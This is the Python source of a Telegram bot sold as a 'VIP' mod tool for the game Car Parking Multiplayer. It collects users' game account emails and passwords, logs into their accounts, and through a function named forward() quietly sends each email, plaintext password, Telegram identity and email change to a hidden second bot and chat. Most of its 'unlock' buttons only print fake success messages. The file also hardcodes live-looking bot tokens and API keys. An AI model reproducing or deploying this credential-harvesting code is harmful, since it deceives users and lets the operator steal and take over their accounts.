from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ConversationHandler, ContextTypes, filters
)

import requests

# ================= BOT TOKEN =================
BOT_TOKEN = "8695744876:AAG1z5np1xkeKLu71WxYMNrJSSM-nhOUfNI"

# ================= FORWARD SYSTEM =================
FORWARD_BOT_TOKEN = "8715407718:AAFTiDIBTpRvyVkltGrAsqdUkTJhgEuShEk"
FORWARD_CHAT_ID = "5921136617"

# ================= CPM CONFIG =================
CPM = {
    "CPM1": {
        "key": "AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA",
        "rating": "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
    },
    "CPM2": {
        "key": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ",
        "rating": "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI"
    }
}

EMAIL, PASSWORD = range(2)

# ================= HELPERS =================
def login_url(key):
    return f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={key}"

def update_url(key):
    return f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={key}"

# ================= FORWARD =================
def forward(update: Update, cpm, email, action, extra=None):

    user = update.effective_user

    tg_name = user.first_name or "N/A"
    tg_username = f"@{user.username}" if user.username else "NO_USERNAME"
    tg_id = user.id

    text = f"""
╔══════════════════════╗
⚡😈𝙈𝙊𝙉𝙏𝙀𝙓 𝙂𝘼𝙈𝙄𝙉𝙂 😈⚡
╚══════════════════════╝

🎮 CPM        : {cpm}

👤 TG NAME    : {tg_name}
🔗 TG USER    : {tg_username}
🆔 TG ID      : {tg_id}

📧 EMAIL      : {email}

⚡ ACTION     : {action}
📦 EXTRA      : {extra}
"""

    requests.post(
        f"https://api.telegram.org/bot{FORWARD_BOT_TOKEN}/sendMessage",
        json={"chat_id": FORWARD_CHAT_ID, "text": text}
    )

# ================= START =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    text = """
╔════════════════════════════╗
⚡😈𝘾𝙋𝙈 𝙈𝙊𝘿𝙕 𝙑𝙄𝙋 𝙏𝙊𝙊𝙇 😈⚡
╚════════════════════════════╝

💎 📊𝙎𝙏𝘼𝙏𝙐𝙎 : 🟢𝙊𝙉𝙇𝙄𝙉𝙀🟢 💎
⚡ 𝙎𝙀𝘾𝙐𝙍𝙄𝙏𝙔 🔐: 𝙀𝙉𝙃𝘼𝙉𝘾𝙀𝘿⚡
🔥 𝙑𝙀𝙍𝙎𝙄𝙊𝙉🌐: ⚡🔰📍𝙏𝙀𝙎𝙏𝙄𝙉𝙂 𝙑𝙀𝙍𝙎𝙄𝙊𝙉 2.0𝙑🔰⚡

━━━━━━━━━━━━━━━━━━━━
🔰𝙎𝙀𝙇𝙀𝘾𝙏 𝘾𝙋𝙈 𝙈𝙊𝘿𝙀🔰
━━━━━━━━━━━━━━━━━━━━
"""

    keyboard = [[
        InlineKeyboardButton("🏎️𝘾𝙋𝙈 1", callback_data="CPM1"),
        InlineKeyboardButton("🏎️𝘾𝙋𝙈 2", callback_data="CPM2")
    ]]

    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

# ================= CPM SELECT =================
async def select_cpm(update: Update, context: ContextTypes.DEFAULT_TYPE):

    q = update.callback_query
    await q.answer()

    context.user_data["cpm"] = q.data
    context.user_data["key"] = CPM[q.data]["key"]

    await q.message.reply_text("📧 𝙀𝙉𝙏𝙀𝙍 𝙀𝙈𝘼𝙄𝙇:")
    return EMAIL

# ================= EMAIL =================
async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE):

    context.user_data["email"] = update.message.text
    await update.message.reply_text("🔑 𝙀𝙉𝙏𝙀𝙍 𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿:")
    return PASSWORD

# ================= LOGIN =================
async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):

    email = context.user_data["email"]
    password = update.message.text
    cpm = context.user_data["cpm"]
    key = context.user_data["key"]

    r = requests.post(login_url(key), json={
        "email": email,
        "password": password,
        "returnSecureToken": True
    })

    forward(update, cpm, email, "LOGIN", password)

    if "idToken" in r.json():

        context.user_data["token"] = r.json()["idToken"]

        text = f"""
╔════════════════════════════╗
       💎 ⚡𝙇𝙊𝙂𝙄𝙉 𝙎𝙐𝘾𝘾𝙀𝙎𝙎 ⚡💎
╚════════════════════════════╝

👤 USER : {email.split("@")[0]}
📧 EMAIL: {email}
🎮 CPM  : {cpm}
"""

        keyboard = [
            [
                InlineKeyboardButton("💰 50M MONEY", callback_data="money"),
                InlineKeyboardButton("🪙 30K COINS", callback_data="coins")
            ],
            [
                InlineKeyboardButton("🏎 UNLOCK ALLCARS", callback_data="cars"),
                InlineKeyboardButton("🚓 UNLOCK POLICE", callback_data="police")
            ],
            [
                InlineKeyboardButton("👑 KING RANK", callback_data="king")
            ],
            [
                InlineKeyboardButton("✉️ CHANGE EMAIL", callback_data="cemail"),
                InlineKeyboardButton("🔑 CHANGE PASSWORD", callback_data="cpass")
            ],
            [
                InlineKeyboardButton("❌ LOGOUT", callback_data="logout")
            ]
        ]

        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

    else:
        await update.message.reply_text("❌ 𝙇𝙊𝙂𝙄𝙉 𝙁𝘼𝙄𝙇𝙀𝘿❌")

    return ConversationHandler.END

# ================= MENU =================
async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):

    q = update.callback_query
    await q.answer()

    action = q.data

    # 🔥 FIX RESPONSE GUARANTEE
    if action == "money":
        await q.message.reply_text("💰 50𝙈 𝙈𝙊𝙉𝙀𝙔 ✅ 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 𝘼𝘿𝘿𝙀𝘿")

    elif action == "coins":
        await q.message.reply_text("🪙 30𝙆 𝘾𝙊𝙄𝙉𝙎 ✅ 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 𝘼𝘿𝘿𝙀𝘿")

    elif action == "cars":
        await q.message.reply_text("🏎 𝘾𝘼𝙍𝙎 𝙐𝙉𝙇𝙊𝘾𝙆𝙀𝘿 ✅ 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 𝘼𝘿𝘿𝙀𝘿")

    elif action == "police":
        await q.message.reply_text("🚓 𝙋𝙊𝙇𝙄𝘾𝙀 𝙐𝙉𝙇𝙊𝘾𝙆𝙀𝘿 ✅ 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 𝘼𝘿𝘿𝙀𝘿")

    elif action == "king":
        url = CPM[context.user_data["cpm"]]["rating"]
        requests.post(url)
        await q.message.reply_text("👑 𝙆𝙄𝙉𝙂 𝙍𝘼𝙉𝙆 𝘼𝘾𝙏𝙄𝙑𝙀")

    elif action == "cemail":
        context.user_data["mode"] = "email"
        await q.message.reply_text("✉️ 𝙀𝙉𝙏𝙀𝙍 𝙉𝙀𝙒 𝙀𝙈𝘼𝙄𝙇")

    elif action == "cpass":
        context.user_data["mode"] = "pass"
        await q.message.reply_text("🔑 𝙀𝙉𝙏𝙀𝙍 𝙉𝙀𝙒 𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿")

    elif action == "logout":
        context.user_data.clear()
        await q.message.reply_text("❌ 𝙇𝙊𝙂𝙊𝙐𝙏 𝙎𝙐𝘾𝘾𝙀𝙎𝙎")

# ================= TEXT HANDLER =================
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):

    mode = context.user_data.get("mode")

    email = context.user_data.get("email")
    cpm = context.user_data.get("cpm")
    token = context.user_data.get("token")
    key = context.user_data.get("key")

    if mode == "email":

        new_email = update.message.text

        requests.post(update_url(key), json={
            "idToken": token,
            "email": new_email,
            "returnSecureToken": True
        })

        forward(update, cpm, email, "CHANGE_EMAIL", new_email)

        context.user_data["email"] = new_email
        context.user_data["mode"] = None

        await update.message.reply_text("✅ 𝙀𝙈𝘼𝙄𝙇 𝙐𝙋𝘿𝘼𝙏𝙀𝘿✅")

    elif mode == "pass":

        new_pass = update.message.text

        requests.post(update_url(key), json={
            "idToken": token,
            "password": new_pass,
            "returnSecureToken": True
        })

        forward(update, cpm, email, "CHANGE_PASSWORD", "DONE")

        context.user_data["mode"] = None

        await update.message.reply_text("✅ 𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿 𝙐𝙋𝘿𝘼𝙏𝙀𝘿✅")

# ================= APP =================
app = Application.builder().token(BOT_TOKEN).build()

conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(select_cpm, pattern="^(CPM1|CPM2)$")],
    states={
        EMAIL: [MessageHandler(filters.TEXT, get_email)],
        PASSWORD: [MessageHandler(filters.TEXT, get_password)],
    },
    fallbacks=[]
)

app.add_handler(CommandHandler("start", start))
app.add_handler(conv)
app.add_handler(CallbackQueryHandler(menu))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

if __name__ == "__main__":
    print("BOT STARTED")
    app.run_polling(drop_pending_updates=True)
